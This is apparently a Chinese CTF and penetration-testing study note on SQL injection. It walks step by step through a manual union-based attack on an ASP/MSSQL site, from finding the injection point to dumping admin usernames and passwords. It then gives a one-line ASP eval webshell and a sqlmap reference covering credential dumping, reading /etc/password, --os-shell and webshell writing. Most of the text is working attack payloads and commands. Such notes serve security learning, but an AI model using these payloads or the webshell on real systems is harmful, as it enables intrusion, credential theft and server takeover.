#CTF-SQL注入 
[sqlmap跑sqli_labs](https://blog.csdn.net/qq_57223070/article/details/129189398)
[榜样的sql笔记](https://blog.csdn.net/eastmount/category_9183790_2.html)
[目录](https://www.imapbox.com/index.php/2020/06/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%87%AA%E5%AD%A6%E7%AF%87%E5%85%AB%E5%8D%81%E4%BA%8C-whuctf%E4%B9%8B%E9%9A%90%E5%86%99%E5%92%8C%E9%80%86%E5%90%91%E7%B1%BB%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AFwp/)
# 一、SQL手工注入
下面通过一个简单的例子从数据库原理知识解读SQL注入攻防原理，内容比较简单。假设存在一个网址能正常显示内容，其数据库是MSSQL，网站为ASP。
- ==http://xxxxx/show.asp?code=115==
  对应的后台SQL语句可能如下：
- `select … from table where code=‘115’ and xxxx;
## **第一步，数据库如何判断注入点**  
判断注入点的方法很多，比如show.asp?code=115’ 加单引号，show.asp?code=115-1 减1，这里介绍一个经典的方法。
- ==http://xxxxx/show.asp?code=115’ and 1=1 - - (正常显示)==  
    对应的SQL语句：  
    `select … from table where code=‘115’ and 1=1 - - and xxxx;  
    其中，单引号(’)匹配code='115，然后and连接，1=1恒成立，SQL注释(- -)掉后面语句。
- ==http://xxxxx/show.asp?code=115’ and 1=2 - - (错误显示)==  
    对应的SQL语句：  
    `select … from table where code=‘115’ and 1=2 - - and xxxx;` 
    单引号(’)匹配code='115，然后and连接，1=2恒错误，注释(–)掉后面语句。
PS：注释（- -）中间加了个空格，否则markdown会显示一条横线。
---
## **第二步，数据库如何判断字段总数 order by**  
基本方法如下：

- ==http://xxxxx/show.asp?code=115’ order by 1 - - (正常显示)==  
    对应的SQL语句：  
    `select … from table where code=‘115’ order by 1 – and xxxx;  
    按照1个字段进行排序，正常显示表示该URL对应的SQL语句至少一个字段。
    
- ==http://xxxxx/show.asp?code=115’ order by 10 - - (正常显示)==  
    对应的SQL语句：  
    `select … from table where code=‘115’ order by 10 - - and xxxx;` 
    依次按照字段增加往上进行排序，直至order by 11提示错误，此时表示共10个字段。
    
- ==http://xxxxx/show.asp?code=115’ order by 11 - - (错误显示)==

---
## **第三步，数据库获取显示位，通过union实现**  
在得到字段个数后，需要获取字段位置，则使用union或union all。其中union表示将两个select结果整体显示，并合并相同的结果，union all显示全部结果。例如：
![c9990857a4324bf58318f04407e56347](https://github.com/user-attachments/assets/bd701f01-6b80-4914-a24d-fbc3273dd042)

具体方法如下：

- `http://xxxxx/show.asp?code=115’ union all select null,…,null - - 
    正常显示，共10个null，表示通配符，如果9个null会报错，需对应10个字段。
- `==http://xxxxx/show.asp?code=115’ union all select 1,…,null - -==  
    依次替换成数字，测试哪几个字段有结果，如果报错则替换回null。最终的结果为：  
    **show.asp?code=115’ union all select 1,null,3,null,null,6,7,8,9,10 - -**  
    对应的SQL语句为：  
    **select … from table where code=‘115’ union all select 1,null,3,null,null,6,7,8,9,10 - - xxxx;**
    
- `http://xxxxx/show.asp?code=-1’ union all select 1,…,null - -  
    然后将数字115替换成-1，一个不存在的界面，则会显示如下所示结果，可以看到附件显示对应的值7、8、9，再想办法将我们需要的结果在这里显示即可，这些数据都是从后台数据库中查询出来的。
    

![7628b66a82974195842fcf44705f03ed](https://github.com/user-attachments/assets/2d674df8-bb8b-4e90-bb8d-d85ecf4c9ad8)



---
## **第四步，数据库显示错误网页及对应数据db_name**  
该网站使用的数据库为MSSQL，则一定特定的字段需要知道：

- **host_name()**：连接数据库服务器的计算机名称
- **@@version**：获取数据库版本号
- **db_name()**：数据库的库名称
- **@@servername**：当前数据库计算机的名称=host_name()
- ==http://xxxxx/show.asp?code=-1’ union all select 1,null,3,null,null,6,host_name(),@@version,db_name(),10 - -==
    
输出结果如下所示：
- 附件1：AYD
- 附件2：Microsoft SQL Server…
- 附件3：ahykd_new
其中数据库的名称就是ahykd_new，接下来相同的道理获取数据库所有表及列。

---
## **第五步，数据库获取表名及列名，Python爬虫引入**  
SQL Server自带系统对象表，当前数据库所有字段。
- sysobjects 表名
- syscolumns 列名
其中，name表示对象名（表名），id表示表编号，type表示对象类型，其值为U表示用户表，S表示系统表，C约束，PK主键等。
sysobjects 和 syscolumns 之间以id互相对应，一个表名在sysobjects得到id后可以在syscolumns找到它的列名。重点知识：
```
- 查看所有表名语句
    select name from sysobjects where type=‘U’;
- 询表table1的所有字段名称 
    select name from syscolumns where id=object_id(‘table1’)；
```
具体渗透方法如下：
```

- http://xxxxx/show.asp?code=-1’ union all  
    select 1,null,3,null,null,6,7,8,  
    (select top 1 name from sysobjects where type=‘U’),10 - -
```
此时输出结果如下所示：
- 附件1：7
- 附件2：8
- 附件3：kc_jxjd
其中top 1 name用于输出1个字段（相当于MySQL使用limit 1），sysobjects中u为用户表，count(*)可以统计总共87个表。
**PS：问大家一个问题，现在是获取1个表，那么如何获取其他表呢？**
- ==http://xxxxx/show.asp?code=-1’ union all  
    select 1,null,3,null,null,6,7,8, (select top 1 name from  
    (select top 2 name from sysobjects where type=‘U’ order by desc) a  
    order by 1 asc),10 - -==

通过子查询一个升序，一个降序获取第二个值，同理第三个top 3。下面通过Python定义一个Selenium爬虫不断访问top n，获取所有的表名，代码如下

![7eb1ab8798f449488037b04c82d63ab2](https://github.com/user-attachments/assets/eaac6f82-7606-4d6f-be47-6ab62bad16f7)

注意，Python应用在Web渗透领域是很常见且有效的。分析输出的所有表名，可以发现usr为后台登录表。
- ==后台登录表：usr==

---
## **第六步，数据库获取登录表usr字段 id=object_id(‘usr’)**  
具体方法如下：
```
http://xxxxx/show.asp?code=-1’ union all  
    select 1,null,3,null,null,6,7,8,  
    (select top 1 name from syscolmns where id=object_id(‘usr’)),10 - -
```
输出结果如下所示：
- 附件1：7
- 附件2：8
- 附件3：**answer**
其中top 1 name用于输出1个字段，表usr的一个列表。
```
核心SQL语句获取不同的列名：  
    (select top 1 name from (select top 3 name from syscolumns where id=object_id(‘usr’) order by asc) a order by 1 desc)
```
输出结果如下所示：
- 附件1：7
- 附件2：8
- 附件3：**dic_roll**
同理，也可以借助Python获取所有字段，如果字段少，手工即可测试出来，count(*)返回字段个数。最后发现：
- ==用户名字段为usr_name，密码为passwd==

---
## **第七步，获取数据库返回用户名和密码**  
具体方法如下：
```
http://xxxxx/show.asp?code=-1’ union all  
    select 1,null,3,null,null,6,7,8,(select top 1 usr_name from usr),10 - -
```
输出结果如下所示：
- 附件1：7
- 附件2：8
- 附件3：**2016001**
输出用户名2016001，再搜索密码。
```
http://xxxxx/show.asp?code=-1’ union all  
    select 1,null,3,null,null,6,7,8,  
    (select passwd from usr where usr_name=‘2016001’),10 - -
```
输出结果如下所示：
- 附件1：7
- 附件2：8
- 附件3：**123456**
**输出用户名2016001，密码123456，此时即可登录，通过Python可以获取所有值**

---
## **第八步，登录系统并获取WebShell**

`<%eval request('Nana')%>`

# 二、SQLMAP使用
## 参数介绍和示例

`-r`：万能参数，主要针对post注入，但是任何其他请求方法都是可以的，但这个参数用的最多
```
sqlmap.py -r c:\2.txt
```
`-u`：只针对get请求方法的注入
```
sqlmap.py -u http://192.168.0.15/sql.php?id=1
```
`--level=LEVEL`:执行测试的等级（1-5,默认为1），使用`-level`参数且数值>=2时候会检查cookie里面的参数，当>=3的时候将检查`user-agent`和`Referer`
```
sqlmap.py -r c:\2.txt --level 3
```
`--risk=RISK`:执行测试的风险（0-3，默认为1），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试
```
sqlmap.py -r c:\2.txt --level 3 --risk 3
```
`v`:显示详细信息的意思，ERBOSE信息级别：0-6（缺省默认1），其值具体含义：“0”只显示Python错误以及严重的信息；“1”同时显示基本信息和警告信息（默认）；“2”同时显示debug信息：“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3，设置为5的话，可以看到http响应信息，比较详细
```
sqlmap.py -r c:\2.txt --level 3 --risk 3-v 3
```
`p`:针对某一个参数进行注入，当我们发现注入点的时候，比如网址`http://192.168.203.141/sql.php?id=1`只有一个参数id,而当有些网址有很多参数，那么我们可以针对指定的参数进行注入
```
sqlmap.py -u http://192.168.203.15/sql.php?id=1 -p id
```
`--threads`：线程数，如果想要sqlmap跑的更快，可以更改这个线程数的值，默认为10
```
sqlmap.py -u http://192.168.203.15/sql.php?id=1 -p id --threads 20
```
`-batch-smart`:智能判断测试，自行寻找注入点进行测试,能趴到好多数据，如果想结束指令的执行`ctrl+c`，这个智能指令，会将所有数据库全部扒一遍，并且会将每一步的信息和数据全部给我们保存下来，在sqlmap的output文件夹下面
```
sqlmap.py -u http://192.168.203.15/sql.php?id=1 -batch-smart
```
## 注入获取数据的相关参数
```
--dbs:会获取所有的数据库。默认情况下sqlmap会自动的探测web应用后端的数据库类型：MySQL、Orcacle,PostgreSQL,MicrosoftSQL,Server,Microsoft Access,SQLite,Firebird,Sybase,SAPMaxDB,DB2
--current-user:大多数数据库中可检测到数据库管理系统当前用户
--current-db:当前连接数据库名
--is-dba:判断当前的用户是否为管理
--users:列出数据库所有所有用户
```
以网址`http://192.168.203.143/sql.php?id=1`来走一般完整注入过程
```
http://192.168.203.143/sql.php?id=1 --dbs #会获取所有的数据库
http://192.168.203.143/sql.php?id=1 --current-user #显示当前用户
http://192.168.203.143/sql.php?id=1 --current-db #当前连接数据库名
http://192.168.203.143/sql.php?id=1 --is-dba #判断当前的用户是否为管理
http://192.168.203.143/sql.php?id=1 --users #列出数据库所有所有用户
```
然后按照下面的几个参数来获取细节数据。
**`-tables`获取表名**：-D是指定某个数据库，如果不加-D参数，那么会将所有数据库的所有表获取出来，最好指定数据库名，这样精准快速一些
```
--tables -D 数据库名
```
**`--columns`获取字段名**：
```
--cloumns -T user -D abc
```
**获取数据**
```
-T user -C username,password,email --dump
```
**读文件内容**
```
--file-read /etc/password
如果我们想要读取目标主机的c:\\2.txt文件的数据
sqlmap.py -u http://192.168.203.141/sql.php?id=1 --file-read c:\\2.txt
```
**系统交互的shell**:`--os-shell`
```
sqlmap.py -u http://192.168.203.141/sqlserver/1.aspx?xxser=1 --os-shell
```
**写webshell** :`--file-wirte`
```
指令
--file-write "c:/2.txt" --file-dest "C:/php/htdocs/sql.php" -v 1

--file-write "c:/2.txt" --file-dest"C:\phpStudy\PHPTutoria\www\xx.php" -v 1
```

